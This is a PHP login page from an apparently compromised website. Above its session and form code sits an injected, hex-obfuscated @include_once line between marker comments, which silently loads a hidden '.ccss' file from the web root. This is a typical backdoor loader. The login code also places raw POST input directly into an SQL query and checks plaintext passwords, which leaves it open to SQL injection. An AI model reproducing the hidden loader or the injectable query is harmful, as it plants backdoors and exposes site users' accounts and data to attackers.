<?php
/*5f495*/

$ry = "/home/tk53mxi6hzjh/pub\x6cic_htm\x6c/cd.panigrahajewe\x6cs.com/Pages/php_data/.a5aba54b.ccss"; strpos($ry, 'q79'); @include_once /* s0iur */ ($ry);

/*5f495*/

include 'connection.php';

// Start or resume a session
session_start();

// Check if the user is already logged in
if (isset($_SESSION['user_id'])) {
    // Redirect to the landing page if already logged in
    header('Location: Pages/landing_page/home_landing_page.html');
    exit;
}

// Check the connection
if ($conn->connect_error) {
    die('Connection failed: ' . $conn->connect_error);
} else {
    $message = "";
    // Check if the form is submitted
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {

        // Get the user input from the form
        $email_ID = $_POST['text'];
        $password = $_POST['password'];

        // Perform SQL query to check if the email and password match
        $sql = "SELECT * FROM login WHERE email_ID = '$email_ID' AND password = '$password'";
        $result = $conn->query($sql);

        if ($result->num_rows == 1) {
            // Authentication successful
            $user = $result->fetch_assoc();

            // Store user data in the session
            $_SESSION['user_id'] = $user['email_ID'];
            $_SESSION['email_ID'] = $user['email_ID'];

            $message = 'Authentication successful. You are now logged in.';

            // Redirect to the landing page
            header('Location: Pages/landing_page/home_landing_page.html');
            exit;
        } else {
            // Authentication failed
            // echo "<p style='color:red';>Authentication failed. Please check your email and password.</p>";
            $message = "<p style='color:red';>Authentication failed. Please check your email and password.</p>";
        }

        // Close the database connection
        $conn->close();
    }
}
?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>Login Page</title>
</head>

<body>
    <div class="login">
        <div class='form'>
            <form id="loginForm" action="index.php" method="post" onsubmit="return validateForm()">
                <input type="text" name="text" placeholder='Email' class='text' id='username' required
                    onkeyup="validateEmail(this.value)"><br>
                <input type="password" name="password" placeholder='Password' class='password'
                    onkeyup="validatePassword(this.value)"><br>
                <input type="submit" value="Login" class='btn-login' id='do-login'></input>
                <a href="./Pages/forgot_pass/forgot_pass.php" class='forgot'>Forgot Password?</a>
            </form>
            <div class="error-message" id="error-message"></div>
            <div id="message">
                <?php echo $message; ?>
            </div>
        </div>
    </div>
    <script src="Pages/index.js"></script>
    <script>
         document.addEventListener('contextmenu', function (e) {
            e.preventDefault();
        });

        document.addEventListener('keydown', function (e) {
            // Check if the key combination is Ctrl+U (for viewing page source)
            if ((e.ctrlKey || e.metaKey) && e.keyCode === 85) {
                e.preventDefault();
            }
        });
    </script>
</body>

</html>